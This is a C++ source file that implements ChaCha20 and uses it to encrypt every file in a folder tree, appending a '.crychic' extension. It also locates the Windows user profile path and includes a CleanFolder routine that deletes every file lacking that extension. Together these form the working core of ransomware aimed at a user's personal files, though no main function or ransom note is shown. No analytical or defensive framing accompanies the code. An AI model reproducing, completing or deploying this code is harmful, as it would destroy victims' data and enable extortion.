#include <iostream>
#include <fstream>
#include <filesystem>
#include <vector>


namespace fs = std::filesystem;


// ChaCha20 constants
constexpr int BLOCK_SIZE = 64;
constexpr int KEY_SIZE = 32;
constexpr int NONCE_SIZE = 12;


// ChaCha20 state
struct ChaCha20State {
    uint32_t state[16];
};


// Rotate a 32-bit integer
inline uint32_t rotate(uint32_t v, int c) {
    return (v << c) | (v >> (32 - c));
}


// Quarter round function
inline void quarter_round(uint32_t& a, uint32_t& b, uint32_t& c, uint32_t& d) {
    a += b; d ^= a; d = rotate(d, 16);
    c += d; b ^= c; b = rotate(b, 12);
    a += b; d ^= a; d = rotate(d, 8);
    c += d; b ^= c; b = rotate(b, 7);
}


// Double round function
void double_round(ChaCha20State& state) {
    quarter_round(state.state[0], state.state[4], state.state[8], state.state[12]);
    quarter_round(state.state[1], state.state[5], state.state[9], state.state[13]);
    quarter_round(state.state[2], state.state[6], state.state[10], state.state[14]);
    quarter_round(state.state[3], state.state[7], state.state[11], state.state[15]);
    quarter_round(state.state[0], state.state[5], state.state[10], state.state[15]);
    quarter_round(state.state[1], state.state[6], state.state[11], state.state[12]);
    quarter_round(state.state[2], state.state[7], state.state[8], state.state[13]);
    quarter_round(state.state[3], state.state[4], state.state[9], state.state[14]);
}


// Initialize ChaCha20 state
void chacha20_init(ChaCha20State& state, const uint8_t* key, const uint8_t* nonce, uint32_t counter) {
    state.state[0] = 0x61707865;
    state.state[1] = 0x3320646e;
    state.state[2] = 0x79622d32;
    state.state[3] = 0x6b206574;


    for (int i = 0; i < 8; ++i) {
        state.state[4 + i] = reinterpret_cast<const uint32_t*>(key)[i];
    }


    state.state[12] = counter;
    for (int i = 0; i < 3; ++i) {
        state.state[13 + i] = reinterpret_cast<const uint32_t*>(nonce)[i];
    }
}


// Generate ChaCha20 block
void chacha20_block(ChaCha20State& state, uint8_t* output) {
    ChaCha20State working_state = state;
    for (int i = 0; i < 10; ++i) {
        double_round(working_state);
    }
    for (int i = 0; i < 16; ++i) {
        working_state.state[i] += state.state[i];
        reinterpret_cast<uint32_t*>(output)[i] = working_state.state[i];
    }
    ++state.state[12];
}


// Encrypt or decrypt data using ChaCha20
void chacha20_crypt(const uint8_t* key, const uint8_t* nonce, uint32_t counter, const uint8_t* input, uint8_t* output, size_t length) {
    ChaCha20State state;
    chacha20_init(state, key, nonce, counter);


    uint8_t block[BLOCK_SIZE];
    size_t offset = 0;
    while (offset < length) {
        chacha20_block(state, block);
        size_t block_length = std::min(length - offset, static_cast<size_t>(BLOCK_SIZE));
        for (size_t i = 0; i < block_length; ++i) {
            output[offset + i] = input[offset + i] ^ block[i];
        }
        offset += block_length;
    }
}


// Encrypt a file
void encrypt_file(const fs::path& input_path, const fs::path& output_path, const uint8_t* key, const uint8_t* nonce) {
    std::ifstream input_file(input_path, std::ios::binary);
    std::ofstream output_file(output_path, std::ios::binary);


    std::vector<uint8_t> buffer(std::istreambuf_iterator<char>(input_file), {});
    std::vector<uint8_t> encrypted(buffer.size());


    chacha20_crypt(key, nonce, 0, buffer.data(), encrypted.data(), buffer.size());


    output_file.write(reinterpret_cast<const char*>(encrypted.data()), encrypted.size());
    input_file.close();
    output_file.close();
}


// Decrypt a file
void decrypt_file(const fs::path& input_path, const fs::path& output_path, const uint8_t* key, const uint8_t* nonce) {
    encrypt_file(input_path, output_path, key, nonce); // Encryption and decryption are the same operation in ChaCha20
}


// Encrypt a folder
void encrypt_folder(const fs::path& input_folder, const fs::path& output_folder, const uint8_t* key, const uint8_t* nonce) {
    for (const auto& entry : fs::recursive_directory_iterator(input_folder)) {
        if (entry.is_regular_file()) {
            fs::path relative_path = fs::relative(entry.path(), input_folder);
            relative_path += ".crychic";
            fs::path output_path = output_folder / relative_path;
            fs::create_directories(output_path.parent_path());
            encrypt_file(entry.path(), output_path, key, nonce);
        }
    }
}


// Decrypt a folder
void decrypt_folder(const fs::path& input_folder, const fs::path& output_folder, const uint8_t* key, const uint8_t* nonce) {
    for (const auto& entry : fs::recursive_directory_iterator(input_folder)) {
        if (entry.is_regular_file()) {
            fs::path relative_path = fs::relative(entry.path(), input_folder);
            fs::path output_path = output_folder / relative_path;
            output_path.replace_extension("");
            fs::create_directories(output_path.parent_path());
            decrypt_file(entry.path(), output_path, key, nonce);
        }
    }
}

fs::path GetUserProfilePath() {
    char* buffer = nullptr;
    size_t size = 0;
    if (_dupenv_s(&buffer, &size, "USERPROFILE") == 0 && buffer != nullptr) {
        std::filesystem::path p(buffer);
        free(buffer); // free allocated memory
        return p;
    }
    return {};
}

void CleanFolder(fs::path OriginalFilePath) {
    for (const auto& entry : fs::recursive_directory_iterator(OriginalFilePath)) {
        if (fs::is_regular_file(entry.path())) {
            auto ext = entry.path().extension();
            if (ext == ".crychic") {
                //std::cout << "Keep File " << entry.path() << std::endl;
                continue;
            }
            else {
                fs::remove(entry.path());
                //std::cout << "Remove file " << entry.path() << std::endl;
            }
        }
    }
}